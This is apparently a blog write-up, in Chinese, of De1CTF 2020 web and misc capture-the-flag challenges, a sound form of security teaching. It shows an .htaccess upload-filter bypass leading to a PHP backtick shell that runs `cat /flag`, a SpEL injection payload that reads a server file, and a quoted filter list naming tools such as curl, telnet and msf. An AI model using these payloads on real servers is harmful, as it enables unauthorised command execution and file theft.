---
title: De1CTF 2020 Partial Writeup
key: 43d6a645e0728590bf541b6f81524107
tags:
  - Writeup
  - CTF
date: 2020-05-05 17:02:54
---

## Web

### check in

hint: 服务器5分钟重置一次 The server will reset every 5 mins.

文件上传题目，上传的文件会保存在选手个人的文件目录下，fuzz 发现对上传文件内容作了如下过滤：

```c
perl|pyth|ph|auto|curl|base|>|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!
```

File Format 也进行了限制，可修改 Content-Type: imgae/jpeg 进行绕过。

通过上传 `.htaccess` 配置文件添加 `.asp` 后缀文件解析规则（通过 `\` 换行进行绕过）:

```php
AddType application/x-httpd-p\
hp .asp
```

再上传 `.asp` 后缀文件通过 PHP 短标签结合反引号 **`** 执行命令：

```php
<?=`cat /flag`;
```

获取到 flag: De1ctf{cG1_cG1_cg1_857_857_cgll111ll11lll}.



### calc

Please calculate the content of file /flag

参数提交 URL 路由：`/spel/calc?calc=1*1`，应该是考察 **SpEL 注入**，尝试实例化对象及读取文件。

fuzz 发现过滤了 `String`、 `Runtime`、 `T(`、 `java.lang`、`new` 等关键字，最终发现 SpEL 关键字大小写不敏感，最终 Payload 如下:

```java
neW%20java.util.Scanner(neW%20java.io.File(%22/flag%22)).next()
```

flag: De1CTF{NobodyKnowsMoreThanTrumpAboutJava}.

**- 参考 -**

- [由浅入深SpEL表达式注入漏洞 - Ruilin](http://rui0.cn/archives/1043)

- [Spring Expression Language (SpEL)](https://docs.spring.io/spring/docs/3.0.x/reference/expressions.html)

- [Spring 表达式语言 (SpEL)](http://itmyhome.com/spring/expressions.html)

- [Spring SPEL注入漏洞利用](https://mp.weixin.qq.com/s/XMuDjXgZUkoQTcKicx5djg)

## Misc


### Welcome_to_the_2020_de1ctf

check_in! https://t.me/De1CTF

De1CTF{m4y_th3_f0rc3_b3_w1th_y0u}


### 杂烩 Chowder

hint1: 流量包中的网络连接对解题没有帮助.

hint2: 不需要访问流量里任何一个的服务器地址，所有数据都可以从流量包里直接提取.

hint3: 压缩包密码暴破考点中，密码的长度为 6 位，前两位为 `DE`。

Wireshark 导出 `Misc_Chowder.pcap` 流量包中的 HTTP 对象，提取出 7 张图片，在 `7.png` 中获取到链接如下：

https://drive.google.com/file/d/1JBdPj7eRaXuLCTFGn7AluAxmxQ4k1jvX/view


下载得到 readme.zip，解压获取 readme.docx，binwalk -e readme.docx 获取 You_found_me_Orz.zip。 

根据密码长度为 6 位，前两位为 `DE` 使用 APCHPR 进行暴力破解，得到解压密码 `DE34Q1`，得到 You_found_me_Orz.jpg，进一步 binwalk 分离出压缩文件.

通过 `7zip` 发现交替数据流，系 NTFS 隐写（可参考[利用NTFS交换数据流隐藏文件](https://www.qingsword.com/qing/812.html)）.

![](/assets/images/move/2020-05-05-17-39-43.png)



获取到 flag: De1CTF{E4Sy_M1sc_By_Jaivy_31b229908cb9bb}.


### mc_joinin

Hurry up and join in the game.
We are waiting for you.

hint: mc_joinin的flag格式为：De1CTF{md5(flag)}

在题目环境 Web 页面获取到信息如下：

```
Minecraft 20.20 is developed by De1ta Team based on 1.12
Headless: Client isn't necessary. 
```

首先尝试通过 HMCL 启动器安装 Java 1.12 版本的游戏资源，尝试离线模式加入多人游戏。

![](/assets/images/move/2020-05-05-17-46-26.png)

提示版本不兼容，无法连接至服务器。

![](/assets/images/move/2020-05-05-17-46-37.png)

在 Github 上检索 Minecraft client 找到仓库 [pyCraft](https://github.com/ammaraskar/pyCraft)：

![](/assets/images/move/2020-05-05-17-46-49.png)

运行 pyCraft start.py 尝试连接服务器时提示：

```
VersionMismatch: Server's protocol version of 997 (MC2020) is not supported.
```

在 `./minecraft/__init__.py` 中 229 行添加：`'MC2020':  997,`，再次尝试： 

![](/assets/images/move/2020-05-05-17-47-30.png)

成功连接到服务器， Wireshark 捕获流量进行分析：

![](/assets/images/move/2020-05-05-17-47-50.png)

HIDE FLAG ONE imgur.com/a/ZOrErVM，进而获取到图片：

![](/assets/images/move/2020-05-05-17-48-00.png)

StegSolve 检查时在 Red plane 1 通道获取到隐写信息：

![](/assets/images/move/2020-05-05-17-48-08.png)

对图片进行旋转反向变换后获取到 De1CTF{MC2020_Pr0to3l_Is_Funny-ISn't_It?}.

![](/assets/images/move/2020-05-05-17-48-23.png)

最终 flag: De1CTF{33426ff09d87c2c988f1c3ff250bcd72}.

### Life

No Game No Life!

![](/assets/images/move/2020-05-05-17-50-03.png)

binwalk 检查 game.jpg 发现有附件文件，`-e` 进行分离：


获取到加密压缩包 flag.zip （内含 txt.pilf.txt）及 passphare.png，需要从 png 中获取 key 解压 flag.zip，passphare.png（27 * 27） 如下：

![](/assets/images/move/2020-05-05-17-50-15.png)

尝试作为 QR 、DataMatrix 进行修复识别无果，后通过 Google 搜索 "CTF" "life" "game" 时发现该图很可能出自 [Conway's Game of Life](https://en.wikipedia.org/wiki/Conway%27s_Game_of_Life)（一款模拟细胞演变状态的细胞自动机）。

参考 [Sunshine CTF 2019 Golly Gee Willikers](https://medium.com/ctf-writeups/sunshine-ctf-2019-write-up-c7174c0fb56) , 首先将 passphare.png 转换为 01 矩阵如下：

```
000000000000010000000000000
000000000000000000000000000
001000000000010000000000000
000001010010100001001011000
000110101100101111011001000
000101010101000001011010000
010100000100000110000000100
000110101101100101010010000
000101010101011001101100100
000010101000010001001101000
000100000101100110000000111
000000011110001011001101101
001010010000001000110000010
000001110010110001001101011
001010011011000100000010011
000101111000110100111100010
000001100000011001010101011
000010011001110010101011011
001100001100101000010001001
000000100101000101100000011
111001100100110001001111011
011100100010111010001010010
100000001000100001101001011
100100000010010000110000110
101011110100111111100110010
100011111110110110011111110
001001000011110011101010011
```

再通过如下脚本转换为 [Extended RLE Format](http://golly.sourceforge.net/Help/formats.html):

```python
lines = open("1.txt", "r").read().split("\n")
content = ""
header = "x = 27, y = 27, rule = B3/S23\n"

for line in lines:
    line = line.replace("1", "o")
    line = line.replace("0", "b")
    idx = 0
    currState = "u"
    currNum = 0
    while idx < 28:
        # flush the last one
        if idx == 27:
            if currNum > 1:
                content += str(currNum) + currState
                content += "$"
            else:
                content += line[26]
                content += "$"
            break
        # init state
        if currState == "u":
            currState = line[idx]
            currNum = 1
        # already inited
        # and same state of cell
        elif currState == line[idx]:
            currNum += 1
        elif currState != line[idx]:
            # print("flush now")
            result = str(currNum) + currState if currNum != 1 else currState
            content += result
            currState = line[idx]
            currNum = 1
        # print(line[idx], str(currNum) + currState, content)
        idx += 1

print(header + content)
```

在 https://copy.sh/life/  导入 Extend RLE Format state 如下:

```
x = 27, y = 27, rule = B3/S23
13bo13b$27b$2bo10bo13b$5bobo2bobo4bo2bob2o3b$3b2obob2o2bob4ob2o2bo3b$3bobobobobo5bob2obo4b$bobo5bo5b2o7bo2b$3b2obob2ob2o2bobobo2bo4b$3bobobobobob2o2b2ob2o2bo2b$4bobobo4bo3bo2b2obo3b$3bo5bob2o2b2o7b3o$7b4o3bob2o2b2ob2obo$2bobo2bo6bo3b2o5bob$5b3o2bob2o3bo2b2obob2o$2bobo2b2ob2o3bo6bo2b2o$3bob4o3b2obo2b4o3bob$5b2o6b2o2bobobobob2o$4bo2b2o2b3o2bobobob2ob2o$2b2o4b2o2bobo4bo3bo2bo$6bo2bobo3bob2o6b2o$3o2b2o2bo2b2o3bo2b4ob2o$b3o2bo3bob3obo3bobo2bob$o7bo3bo4b2obo2bob2o$o2bo6bo2bo4b2o4b2ob$obob4obo2b7o2b2o2bob$o3b7ob2ob2o2b7ob$2bo2bo4b4o2b3obobo2b2o$
```

观察下一个 Step 发现 QR Code，获取到 key: AJTC8ADEVRA13AR.

![](/assets/images/move/2020-05-05-17-51-19.png)

进而解压获取到 txt.pilf.txt , 对其内容 flip 反转后 Base64 解码，再次反转后 Base16 解码获取到 flag.

```cmd
txt.pilf.txt > 0QjN1MTM0MTN0QjN3ImNjNzM3QTNmdTN3MTNmdzMzcjNxcjM3QTNmdDN2gzMzUjZ2czM0YDZzMjMxcDZ
flip > ZDcxMjMzZDY0Mzc2ZjUzMzg2NDdmNTQ3MjcxNjczMzdmNTM3NTdmNTQ3MzNjNmI3NjQ0NTM0MTM1NjQ0
b64_decode > d71233d64376f5338647f54727167337f53757f54733c6b7644534135644
flip > 4465314354467b6c33745f75735f73376172745f7468335f67346d33217d
b16_decode > De1CTF{l3t_us_s7art_th3_g4m3!}
```


### Questionnaire

De1CTF 2020 Questionnaire, and we look forward to your reply~

PS. There is also a flag in the questionnaire 😃

https://forms.gle/kXXgHCiLpFRXRijt6

De1CTF{hav3_fun_1n_De1CTF_2020}

